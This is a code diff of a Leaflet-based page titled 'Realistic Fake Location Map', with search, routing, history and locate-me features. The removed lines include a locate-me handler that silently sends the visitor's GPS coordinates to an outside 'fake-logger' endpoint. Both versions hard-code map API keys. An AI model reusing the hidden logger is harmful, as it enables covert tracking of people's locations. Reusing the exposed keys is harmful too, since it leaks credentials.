@@ -1,316 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Realistic Fake Location Map</title>
+  <link rel="icon" href="assets/fav.png" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine@3.2.12/dist/leaflet-routing-machine.css" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+    }
+    #map {
+      height: 100vh;
+      width: 100%;
+      z-index: 1;
+    }
+    .floating-search {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      padding: 10px 15px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.25);
+      display: flex;
+      gap: 10px;
+      z-index: 1001;
+      align-items: center;
+    }
+    .floating-search input {
+      padding: 8px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      width: 220px;
+    }
+    .floating-search button {
+      background: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 12px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .autocomplete-container {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      width: 100%;
+      background: white;
+      border: 1px solid #ccc;
+      z-index: 999;
+      max-height: 200px;
+      overflow-y: auto;
+      border-radius: 4px;
+    }
+    .autocomplete-container .suggestion {
+      padding: 8px 10px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .autocomplete-container .suggestion:hover {
+      background-color: #f0f0f0;
+    }
+    #direction-panel {
+      position: fixed;
+      top: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      max-width: 90%;
+      background: white;
+      padding: 16px;
+      border-radius: 12px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.3);
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      z-index: 1001;
+    }
+    #direction-panel input, #direction-panel button {
+      padding: 8px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    #directionBtn {
+      background-color: #1976d2;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #closeDirectionBtn {
+      background-color: #999;
+      margin-top: 5px;
+    }
+    #history-panel {
+      position: fixed;
+      top: 85px;
+      right: 15px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      width: 250px;
+      padding: 16px;
+      display: none;
+      z-index: 1001;
+    }
+    #historyList {
+      list-style: none;
+      padding: 0;
+      font-size: 14px;
+    }
+    #historyList li {
+      border-bottom: 1px solid #eee;
+      padding: 8px 4px;
+    }
+    .map-ui {
+      position: fixed;
+      bottom: 20px;
+      right: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      z-index: 1002;
+    }
+    .icon {
+      width: 48px;
+      height: 48px;
+      padding: 8px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .icon:hover {
+      background: #f0f0f0;
+    }
+  </style>
+</head>
+<body>
+  <div id="map"></div>
 
-const map = L.map('map').setView([25.276987, 55.296249], 13); // Fake location: Qatar
+  <div class="floating-search">
+    <input id="searchInput" type="text" placeholder="Search..." />
+    <div id="searchSuggestions" class="autocomplete-container"></div>
+    <button id="searchBtn">Search</button>
+  </div>
 
-// MapTiler tiles
-L.tileLayer(`https://api.maptiler.com/maps/streets-v2/256/{z}/{x}/{y}.png?key=TCvevZOKio37CwdIPP3u`, {
-  attribution: '&copy; <a href="https://www.maptiler.com/">MapTiler</a>',
-}).addTo(map);
+  <div id="direction-panel">
+    <input type="text" id="fromInput" placeholder="Start location" />
+    <div id="fromInputSuggestions" class="autocomplete-container"></div>
+    <input type="text" id="toInput" placeholder="Destination" />
+    <div id="toInputSuggestions" class="autocomplete-container"></div>
+    <button id="directionBtn">Get Direction</button>
+    <button id="closeDirectionBtn">Close</button>
+  </div>
 
-let marker = L.marker([25.276987, 55.296249]).addTo(map).bindPopup("Fake Location: Qatar").openPopup();
-let routeControl = null;
-let history = [];
+  <div id="history-panel">
+    <h3>Location History</h3>
+    <ul id="historyList"></ul>
+  </div>
 
-// 🔍 Autocomplete function
-async function fetchSuggestions(query) {
-  const res = await fetch(`https://api.maptiler.com/geocoding/${encodeURIComponent(query)}.json?key=TCvevZOKio37CwdIPP3u&language=en`);
-  const data = await res.json();
-  return data.features;
-}
+  <div class="map-ui">
+    <img src="assets/direction-icon.svg" id="directionToggleBtn" class="icon" title="Directions" />
+    <img src="assets/location-icon.svg" id="locateBtn" class="icon" title="Your Location" />
+    <img src="assets/history-icon.svg" id="historyToggleBtn" class="icon" title="History" />
+    <img src="assets/dark-icon.svg" id="darkModeBtn" class="icon" title="Dark Mode" />
+  </div>
 
-function createSuggestionItem(feature, callback) {
-  const item = document.createElement('div');
-  item.classList.add('suggestion');
-  item.textContent = feature.place_name;
-  item.addEventListener('click', () => callback(feature));
-  return item;
-}
+  <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+  <script src="https://unpkg.com/leaflet-routing-machine@3.2.12/dist/leaflet-routing-machine.min.js"></script>
+  <script>
+    const map = L.map('map').setView([25.276987, 55.296249], 13);
+    const tileURL = 'https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO';
+    L.tileLayer(tileURL, { attribution: '', tileSize: 512, zoomOffset: -1 }).addTo(map);
 
-// 📍 Search Box Logic
-const searchInput = document.getElementById("searchInput");
-const searchBtn = document.getElementById("searchBtn");
-const searchSuggestions = document.getElementById("searchSuggestions");
+    let marker = L.marker([25.276987, 55.296249]).addTo(map);
 
-searchInput.addEventListener("input", async () => {
-  const value = searchInput.value.trim();
-  searchSuggestions.innerHTML = "";
-  if (!value) return;
+    const searchInput = document.getElementById('searchInput');
+    const searchBtn = document.getElementById('searchBtn');
+    const searchSuggestions = document.getElementById('searchSuggestions');
 
-  const results = await fetchSuggestions(value);
-  results.forEach(feature => {
-    const item = createSuggestionItem(feature, selected => {
-      moveToLocation(selected);
-      saveToHistory(selected);
-      searchInput.value = selected.place_name;
-      searchSuggestions.innerHTML = "";
-    });
-    searchSuggestions.appendChild(item);
-  });
-});
-
-searchBtn.addEventListener("click", async () => {
-  const value = searchInput.value.trim();
-  if (!value) return;
-  const results = await fetchSuggestions(value);
-  if (results.length > 0) {
-    moveToLocation(results[0]);
-    saveToHistory(results[0]);
-  }
-});
-
-function moveToLocation(feature) {
-  const [lon, lat] = feature.center;
-  if (marker) map.removeLayer(marker);
-  marker = L.marker([lat, lon]).addTo(map).bindPopup(feature.place_name).openPopup();
-  map.setView([lat, lon], 14);
-}
-
-function saveToHistory(feature) {
-  history.push(feature.place_name);
-  updateHistory();
-}
-
-function updateHistory() {
-  const list = document.getElementById("historyList");
-  list.innerHTML = "";
-  history.slice(-10).reverse().forEach(item => {
-    const li = document.createElement("li");
-    li.textContent = item;
-    list.appendChild(li);
-  });
-}
-
-// 🧭 Direction Panel Logic
-const fromInput = document.getElementById("fromInput");
-const toInput = document.getElementById("toInput");
-const fromSuggestions = document.getElementById("fromInputSuggestions");
-const toSuggestions = document.getElementById("toInputSuggestions");
-
-async function handleDirectionAutocomplete(inputEl, suggestionsEl, isFrom) {
-  const value = inputEl.value.trim();
-  suggestionsEl.innerHTML = "";
-  if (!value) return;
-
-  const results = await fetchSuggestions(value);
-  results.forEach(feature => {
-    const item = createSuggestionItem(feature, selected => {
-      inputEl.value = selected.place_name;
-      inputEl.dataset.lat = selected.center[1];
-      inputEl.dataset.lon = selected.center[0];
-      suggestionsEl.innerHTML = "";
-    });
-    suggestionsEl.appendChild(item);
-  });
-}
-
-fromInput.addEventListener("input", () => handleDirectionAutocomplete(fromInput, fromSuggestions, true));
-toInput.addEventListener("input", () => handleDirectionAutocomplete(toInput, toSuggestions, false));
-
-document.getElementById("directionBtn").addEventListener("click", () => {
-  const fromLat = parseFloat(fromInput.dataset.lat);
-  const fromLon = parseFloat(fromInput.dataset.lon);
-  const toLat = parseFloat(toInput.dataset.lat);
-  const toLon = parseFloat(toInput.dataset.lon);
-
-  if (routeControl) map.removeControl(routeControl);
-
-  routeControl = L.Routing.control({
-    waypoints: [
-      L.latLng(fromLat, fromLon),
-      L.latLng(toLat, toLon)
-    ],
-    routeWhileDragging: false
-  }).addTo(map);
-});
-
-document.getElementById("closeDirectionBtn").addEventListener("click", () => {
-  document.getElementById("direction-panel").style.display = "none";
-});
-
-// 📍 "Locate Me" Button
-document.getElementById("locateBtn").addEventListener("click", () => {
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported!");
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(pos => {
-    const { latitude, longitude } = pos.coords;
-    if (marker) map.removeLayer(marker);
-    marker = L.marker([latitude, longitude]).addTo(map).bindPopup("Your Current Location").openPopup();
-    map.setView([latitude, longitude], 14);
-  }, () => {
-    alert("Permission denied or location unavailable.");
-  });
-});
-
-// 🕹️ Panel Toggles
-document.getElementById("directionToggleBtn").addEventListener("click", () => {
-  const panel = document.getElementById("direction-panel");
-  panel.style.display = (panel.style.display === "flex") ? "none" : "flex";
-});
-
-document.getElementById("historyToggleBtn").addEventListener("click", () => {
-  const panel = document.getElementById("history-panel");
-  panel.style.display = (panel.style.display === "block") ? "none" : "block";
-});
-
-// 🌗 Dark Mode
-document.getElementById("darkModeBtn").addEventListener("click", () => {
-  document.body.classList.toggle("dark-mode");
-});
-
-
-// Show/hide history
-document.getElementById('historyToggleBtn').addEventListener('click', () => {
-  const panel = document.getElementById('history-panel');
-  panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
-});
-
-// Show/hide direction panel, toggle search box
-document.getElementById('directionToggleBtn').addEventListener('click', () => {
-  const dir = document.getElementById('direction-panel');
-  const search = document.querySelector('.floating-search');
-  dir.style.display = 'block';
-  search.style.display = 'none';
-});
-
-document.getElementById('closeDirectionBtn').addEventListener('click', () => {
-  document.getElementById('direction-panel').style.display = 'none';
-  document.querySelector('.floating-search').style.display = 'flex';
-});
-
-// Search Place
-document.getElementById('searchBtn').addEventListener('click', () => {
-// Setup clear button functionality ONCE
-const searchInput = document.getElementById('searchInput');
-const clearBtn = document.getElementById('clearSearch');
-
-searchInput.addEventListener('input', () => {
-  clearBtn.style.display = searchInput.value.length > 0 ? 'block' : 'none';
-});
-
-clearBtn.addEventListener('click', () => {
-  searchInput.value = '';
-  clearBtn.style.display = 'none';
-  document.getElementById('searchSuggestions').innerHTML = '';
-  searchInput.focus();
-});
-
-// Search Place logic
-document.getElementById('searchBtn').addEventListener('click', () => {
-  const place = searchInput.value;
-
-  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${place}`)
-    .then(res => res.json())
-    .then(data => {
-      if (data && data.length > 0) {
-        const lat = data[0].lat, lon = data[0].lon;
-        map.setView([lat, lon], 15);
-        L.marker([lat, lon], { icon: googleRedIcon }).addTo(map);
-        addHistory(`Searched: ${place}`);
-      }
-    });
-});
-
-
-
-// Autocomplete for Search
-document.getElementById('searchInput').addEventListener('input', function () {
-  const query = this.value;
-  const container = document.getElementById('searchSuggestions');
-  container.innerHTML = '';
-  if (query.length < 2) return;
-
-  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
-    .then(res => res.json())
-    .then(data => {
-      data.slice(0, 5).forEach(place => {
+    async function fetchSuggestions(query, container, callback) {
+      const res = await fetch(`https://api.maptiler.com/geocoding/${query}.json?key=VcSgtSTkXfCbU3n3RqBO&language=en`);
+      const data = await res.json();
+      container.innerHTML = '';
+      data.features.forEach(place => {
         const div = document.createElement('div');
-        div.className = 'suggestion';
-        div.textContent = place.display_name;
-        div.addEventListener('click', () => {
-          document.getElementById('searchInput').value = place.display_name;
-          container.innerHTML = '';
-        });
+        div.classList.add('suggestion');
+        div.textContent = place.place_name;
+        div.onclick = () => callback(place);
         container.appendChild(div);
       });
-    });
-});
-
-// Directions
-let control;
-document.getElementById('directionBtn').addEventListener('click', () => {
-  const from = document.getElementById('fromInput').value;
-  const to = document.getElementById('toInput').value;
-  if (control) map.removeControl(control);
-
-  control = L.Routing.control({
-    waypoints: [],
-    router: L.Routing.mapbox('pk.eyJ1IjoibWFwdGlsZXIiLCJhIjoiY2t1OXlhbDFvMGc0dTJvcGQ5NmR3eHZybyJ9.d1m4w4O0qln07trDQUuKAw'),
-    createMarker: (i, wp) => {
-      return L.marker(wp.latLng, {
-        icon: i === 0 ? customStartIcon : googleRedIcon
-      });
     }
-  }).addTo(map);
 
-  Promise.all([
-    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`).then(res => res.json()),
-    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`).then(res => res.json())
-  ]).then(([fromData, toData]) => {
-    if (fromData.length && toData.length) {
-      const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
-      const toLatLng = L.latLng(toData[0].lat, toData[0].lon);
-      control.setWaypoints([fromLatLng, toLatLng]);
-      addHistory(`Direction: ${from} → ${to}`);
-    }
-  });
-});
-
-// Autocomplete for Directions
-['fromInput', 'toInput'].forEach(id => {
-  const input = document.getElementById(id);
-  const suggestionBox = document.getElementById(`${id}Suggestions`);
-
-  input.addEventListener('input', () => {
-    const query = input.value;
-    suggestionBox.innerHTML = '';
-    if (query.length < 2) return;
-
-    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
-      .then(res => res.json())
-      .then(data => {
-        data.slice(0, 5).forEach(place => {
-          const div = document.createElement('div');
-          div.className = 'suggestion';
-          div.textContent = place.display_name;
-          div.addEventListener('click', () => {
-            input.value = place.display_name;
-            suggestionBox.innerHTML = '';
-          });
-          suggestionBox.appendChild(div);
+    searchInput.addEventListener('input', () => {
+      if (searchInput.value.length > 2) {
+        fetchSuggestions(searchInput.value, searchSuggestions, (place) => {
+          const [lon, lat] = place.center;
+          marker.setLatLng([lat, lon]);
+          map.setView([lat, lon], 16);
+          searchSuggestions.innerHTML = '';
         });
-      });
-  });
-});
-
-// 🌍 Locate User
-document.getElementById('locateBtn').addEventListener('click', () => {
-  navigator.geolocation.getCurrentPosition(pos => {
-    const lat = pos.coords.latitude, lon = pos.coords.longitude;
-    map.setView([lat, lon], 15);
-    L.marker([lat, lon], { icon: currentLocationIcon }).addTo(map);
-    addHistory(`Current Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
-
-    // 🧠 Send to backend
-    fetch('https://fake-logger.onrender.com/logger.php', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        lat: lat,
-        lon: lon,
-        source: 'leaflet',
-        gps: true
-      })
+      }
     });
-  });
-});
+
+    searchBtn.onclick = () => {
+      if (searchInput.value.length > 2) {
+        fetchSuggestions(searchInput.value, searchSuggestions, (place) => {
+          const [lon, lat] = place.center;
+          marker.setLatLng([lat, lon]);
+          map.setView([lat, lon], 16);
+        });
+      }
+    };
+
+    document.getElementById('directionToggleBtn').onclick = () => {
+      const panel = document.getElementById('direction-panel');
+      panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
+    };
+
+    document.getElementById('closeDirectionBtn').onclick = () => {
+      document.getElementById('direction-panel').style.display = 'none';
+    };
+
+    document.getElementById('directionBtn').onclick = async () => {
+      const fromText = document.getElementById('fromInput').value;
+      const toText = document.getElementById('toInput').value;
+
+      const fetchCoord = async (text) => {
+        const res = await fetch(`https://api.maptiler.com/geocoding/${text}.json?key=VcSgtSTkXfCbU3n3RqBO`);
+        const data = await res.json();
+        const [lon, lat] = data.features[0].center;
+        return [lat, lon];
+      };
+
+      const from = await fetchCoord(fromText);
+      const to = await fetchCoord(toText);
+
+      if (window.routingControl) map.removeControl(window.routingControl);
+      window.routingControl = L.Routing.control({
+        waypoints: [L.latLng(...from), L.latLng(...to)],
+        routeWhileDragging: false
+      }).addTo(map);
+    };
+
+    document.getElementById('locateBtn').onclick = () => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        marker.setLatLng([latitude, longitude]);
+        map.setView([latitude, longitude], 16);
+      });
+    };
+
+    document.getElementById('historyToggleBtn').onclick = () => {
+      const panel = document.getElementById('history-panel');
+      panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    };
+
+    document.getElementById('darkModeBtn').onclick = () => {
+      document.body.classList.toggle('dark-mode');
+    };
+
+    map.on('dblclick', () => {
+      if (marker) map.removeLayer(marker);
+    });
+  </script>
+</body>
+</html>
